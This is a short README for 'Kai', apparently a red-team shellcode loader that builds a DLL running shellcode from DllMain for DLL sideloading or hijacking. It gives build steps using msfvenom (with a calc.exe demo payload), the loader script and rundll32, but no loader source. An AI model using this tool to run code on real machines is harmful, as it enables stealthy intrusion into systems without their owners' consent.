# Kai

A shellcode loader based on [charlotte](https://github.com/9emin1/charlotte), thank you @9emin1!

![](https://ew.com/thmb/3i8WhApnsVOei_-e60ooTLK28Bg=/1500x0/filters:no_upscale():max_bytes(150000):strip_icc():format(webp)/screen20shot202015-07-2820at202-27-5520pm-3c0681e857aa4b77a7e638f43d65e043.png)

Mainly has the same features as Charlotte, but main difference is that the output DLL does not expose any export functions. Rather, the execution of shellcode occurs in `DllMain` allowing it to be used for DLL sideloading/hijacking. Execution of main program is paused using [Stability Hooking](https://gist.github.com/monoxgas/5027de10caad036c864efb32533202ec) by @monoxgas so that the program doesn't crash. I was too lazy to add dynamic obfuscation of variables but oh well, at least it works.


## Usage

Install mingw-w64 libraries:

```bash
apt-get install mingw-w64*
```

Generate shellcode, e.g.:

```bash
msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o shellcode.bin
```

Run Kai:

```bash
python3 kai.py shellcode.bin
```

This will generate a file called `kai.dll`, which then can be transfered to a Windows machine and executed using `rundll32` or ran through a tool such as [Koppeling](https://github.com/monoxgas/Koppeling) for DLL sideloading/hijacking.
